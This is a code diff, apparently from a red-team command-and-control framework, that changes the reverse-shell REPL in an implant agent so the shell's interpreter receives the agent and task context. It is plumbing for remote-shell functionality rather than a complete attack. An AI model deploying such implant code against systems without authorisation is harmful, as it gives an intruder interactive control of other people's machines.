@@ -3,8 +3,10 @@ use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse}
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::io::{Read, Write};
 use std::path::Path;
+use std::sync::Arc;
 use transport::Transport;
 
+use crate::agent::ImixAgent;
 use crossterm::{
     cursor,
     style::{Color, SetForegroundColor},
@@ -191,7 +193,11 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     Ok(())
 }
 
-pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T) -> Result<()> {
+pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
+    task_id: i64,
+    mut transport: T,
+    agent: ImixAgent<T>,
+) -> Result<()> {
     // Channels to manage gRPC stream
     let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
     let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);
@@ -218,17 +224,20 @@ pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T
     }
 
     // Move logic to blocking thread
-    run_repl_loop(task_id, input_rx, output_tx).await;
+    run_repl_loop(task_id, input_rx, output_tx, agent).await;
     Ok(())
 }
 
-async fn run_repl_loop(
+async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     task_id: i64,
     mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
     output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
+    agent: ImixAgent<T>,
 ) {
     let _ = tokio::task::spawn_blocking(move || {
-        let mut interpreter = Interpreter::new().with_default_libs();
+        let mut interpreter = Interpreter::new()
+            .with_default_libs()
+            .with_task_context(Arc::new(agent), task_id, Vec::new());
         let mut repl = Repl::new();
         let mut stdout = VtWriter {
             tx: output_tx,
